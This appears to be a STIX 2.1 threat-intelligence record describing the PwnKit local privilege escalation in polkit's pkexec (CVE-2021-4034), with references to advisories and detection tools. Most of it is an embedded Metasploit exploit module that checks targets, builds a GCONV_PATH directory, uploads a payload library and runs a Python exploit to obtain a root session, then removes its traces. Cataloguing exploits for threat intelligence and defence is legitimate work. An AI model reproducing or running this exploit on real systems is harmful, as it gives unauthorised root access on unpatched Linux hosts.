{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0adcd517-c87f-4903-84bb-4fca5ed2beea",
    "created": "2024-08-14T16:59:31.864894Z",
    "modified": "2024-08-14T16:59:31.864898Z",
    "name": "Local Privilege Escalation in polkits pkexec",
    "description": " A bug exists in the polkit pkexec binary in how it processes arguments.  If the binary is provided with no arguments, it will continue to process environment variables as argument variables, but without any security checking. By using the execve call we can specify a null argument list and populate the proper environment variables.  This exploit is architecture independent.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/cve_2021_4034_pwnkit_lpe_pkexec.rb",
            "external_id": "cve_2021_4034_pwnkit_lpe_pkexec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-4034"
        },
        {
            "source_name": "reference",
            "url": "https://www.whitesourcesoftware.com/resources/blog/polkit-pkexec-vulnerability-cve-2021-4034/"
        },
        {
            "source_name": "reference",
            "url": "https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/cyberark/PwnKit-Hunter/blob/main/CVE-2021-4034_Finder.py#vulnversions"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Local Privilege Escalation in polkits pkexec',\n        'Description' => %q{\n          A bug exists in the polkit pkexec binary in how it processes arguments.  If\n          the binary is provided with no arguments, it will continue to process environment\n          variables as argument variables, but without any security checking.\n          By using the execve call we can specify a null argument list and populate the\n          proper environment variables.  This exploit is architecture independent.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Qualys Security',  # Original vulnerability discovery\n          'Andris Raugulis',  # Exploit writeup and PoC\n          'Dhiraj Mishra',    # Metasploit Module\n          'bwatters-r7'       # Metasploit Module\n        ],\n        'DisclosureDate' => '2022-01-25',\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [\n            'x86_64',\n            {\n              'Arch' => [ ARCH_X64 ]\n            }\n          ],\n          [\n            'x86',\n            {\n              'Arch' => [ ARCH_X86 ]\n            }\n          ],\n          [\n            'aarch64',\n            {\n              'Arch' => [ ARCH_AARCH64 ]\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PrependSetgid' => true,\n          'PrependSetuid' => true\n        },\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2021-4034' ],\n          [ 'URL', 'https://www.whitesourcesoftware.com/resources/blog/polkit-pkexec-vulnerability-cve-2021-4034/' ],\n          [ 'URL', 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt' ],\n          [ 'URL', 'https://github.com/arthepsy/CVE-2021-4034' ], # PoC Reference\n          [ 'URL', 'https://www.ramanean.com/script-to-detect-polkit-vulnerability-in-redhat-linux-systems-pwnkit/' ], # Vuln versions\n          [ 'URL', 'https://github.com/cyberark/PwnKit-Hunter/blob/main/CVE-2021-4034_Finder.py' ] # vuln versions\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('WRITABLE_DIR', [ true, 'A directory where we can write files', '/tmp' ]),\n      OptString.new('PKEXEC_PATH', [ false, 'The path to pkexec binary', '' ])\n    ])\n    register_advanced_options([\n      OptString.new('FinalDir', [ true, 'A directory to move to after the exploit completes', '/' ]),\n    ])\n  end\n\n  def on_new_session(new_session)\n    # The directory the payload launches in gets deleted and breaks some commands\n    # unless we change into a directory that exists\n    old_session = @session\n    @session = new_session\n    cd(datastore['FinalDir'])\n    @session = old_session\n    super\n  end\n\n  # This will likely make it into a library, so we should remove it when that happens\n  def kernel_arch\n    arch = kernel_hardware\n    return ARCH_X64 if arch == 'x86_64' || arch == 'amd64'\n    return ARCH_AARCH64 if arch == 'aarch64' || arch == 'arm64'\n    return ARCH_ARMLE if arch.start_with? 'arm'\n    return ARCH_X86 if arch.end_with? '86'\n\n    arch\n  end\n\n  def find_pkexec\n    vprint_status('Locating pkexec...')\n    if exists?(pkexec = cmd_exec('which pkexec'))\n      vprint_status(\"Found pkexec here: #{pkexec}\")\n      return pkexec\n    end\n\n    return nil\n  end\n\n  def check\n    # Is the arch supported?\n    arch = kernel_hardware\n    unless arch.include?('x86_64') || arch.include?('aarch64') || arch.include?('x86')\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n\n    # check the binary\n    pkexec_path = datastore['PKEXEC_PATH']\n    pkexec_path = find_pkexec if pkexec_path.empty?\n    return CheckCode::Safe('The pkexec binary was not found; try populating PkexecPath') if pkexec_path.nil?\n\n    # we don't use the reported version, but it can help with troubleshooting\n    version_output = cmd_exec(\"#{pkexec_path} --version\")\n    version_array = version_output.split(' ')\n    if version_array.length > 2\n      pkexec_version = Rex::Version.new(version_array[2])\n      vprint_status(\"Found pkexec version #{pkexec_version}\")\n    end\n\n    return CheckCode::Safe('The pkexec binary setuid is not set') unless setuid?(pkexec_path)\n\n    # Grab the package version if we can to help troubleshoot\n    sysinfo = get_sysinfo\n    begin\n      if sysinfo[:distro] =~ /[dD]ebian/\n        vprint_status('Determined host os is Debian')\n        package_data = cmd_exec('dpkg -s policykit-1')\n        pulled_version = package_data.scan(/Version:\\s(.*)/)[0][0]\n        vprint_status(\"Polkit package version = #{pulled_version}\")\n      end\n      if sysinfo[:distro] =~ /[uU]buntu/\n        vprint_status('Determined host os is Ubuntu')\n        package_data = cmd_exec('dpkg -s policykit-1')\n        pulled_version = package_data.scan(/Version:\\s(.*)/)[0][0]\n        vprint_status(\"Polkit package version = #{pulled_version}\")\n      end\n      if sysinfo[:distro] =~ /[cC]entos/\n        vprint_status('Determined host os is CentOS')\n        package_data = cmd_exec('rpm -qa | grep polkit')\n        vprint_status(\"Polkit package version = #{package_data}\")\n      end\n    rescue StandardError => e\n      vprint_status(\"Caught exception #{e} Attempting to retrieve polkit package value.\")\n    end\n\n    if sysinfo[:distro] =~ /[fF]edora/\n      # Fedora should be supported, and it passes the check otherwise, but it just\n      # does not seem to work.  I am not sure why.  I have tried with SeLinux disabled.\n      return CheckCode::Safe('Fedora is not supported')\n    end\n\n    # run the exploit in check mode if everything looks right\n    if run_exploit(true)\n      return CheckCode::Vulnerable\n    end\n\n    return CheckCode::Safe('The target does not appear vulnerable')\n  end\n\n  def find_exec_program\n    return 'python' if command_exists?('python')\n    return 'python3' if command_exists?('python3')\n\n    return nil\n  end\n\n  def run_exploit(check)\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless check\n      # on check, the value for payloads is nil, so this will crash\n      # also, check should not care about your payload\n      vprint_status(\"Detected payload arch: #{payload.arch.first}\")\n      host_arch = kernel_arch\n      vprint_status(\"Detected host architecture: #{host_arch}\")\n      if host_arch != payload.arch.first\n        fail_with(Failure::BadConfig, 'Payload/Host architecture mismatch.  Please select the proper target architecture')\n      end\n    end\n    pkexec_path = datastore['PKEXEC_PATH']\n    if pkexec_path.empty?\n      pkexec_path = find_pkexec\n    end\n\n    python_binary = find_exec_program\n\n    # Do we have the pkexec binary?\n    if pkexec_path.nil?\n      fail_with Failure::NotFound, 'The pkexec binary was not found; try populating PkexecPath'\n    end\n\n    # Do we have the python binary?\n    if python_binary.nil?\n      fail_with Failure::NotFound, 'The python binary was not found; try populating PythonPath'\n    end\n\n    unless writable? datastore['WRITABLE_DIR']\n      fail_with Failure::BadConfig, \"#{datastore['WRITABLE_DIR']} is not writable\"\n    end\n\n    local_dir = \".#{Rex::Text.rand_text_alpha_lower(6..12)}\"\n    working_dir = \"#{datastore['WRITABLE_DIR']}/#{local_dir}\"\n    mkdir(working_dir)\n    register_dir_for_cleanup(working_dir)\n\n    random_string_1 = Rex::Text.rand_text_alpha_lower(6..12).to_s\n    random_string_2 = Rex::Text.rand_text_alpha_lower(6..12).to_s\n    @old_wd = pwd\n    cd(working_dir)\n    cmd_exec('mkdir -p GCONV_PATH=.')\n    cmd_exec(\"touch GCONV_PATH=./#{random_string_1}\")\n    cmd_exec(\"chmod a+x GCONV_PATH=./#{random_string_1}\")\n    cmd_exec(\"mkdir -p #{random_string_1}\")\n\n    payload_file = \"#{working_dir}/#{random_string_1}/#{random_string_1}.so\"\n    unless check\n      upload_and_chmodx(payload_file.to_s, generate_payload_dll)\n      register_file_for_cleanup(payload_file)\n    end\n\n    exploit_file = \"#{working_dir}/.#{Rex::Text.rand_text_alpha_lower(6..12)}\"\n\n    write_file(exploit_file, exploit_data('CVE-2021-4034', 'cve_2021_4034.py'))\n    register_file_for_cleanup(exploit_file)\n\n    cmd = \"#{python_binary} #{exploit_file} #{pkexec_path} #{payload_file} #{random_string_1} #{random_string_2}\"\n    print_warning(\"Verify cleanup of #{working_dir}\")\n    vprint_status(\"Running #{cmd}\")\n    output = cmd_exec(cmd)\n\n    # Return to the old working directory before we delete working_directory\n    cd(@old_wd)\n    cmd_exec(\"rm -rf #{working_dir}\")\n    vprint_status(output) unless output.empty?\n    # Return proper value if we are using exploit-as-a-check\n    if check\n      return false if output.include?('pkexec --version')\n\n      return true\n    end\n  end\n\n  def exploit\n    run_exploit(false)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-01-25",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}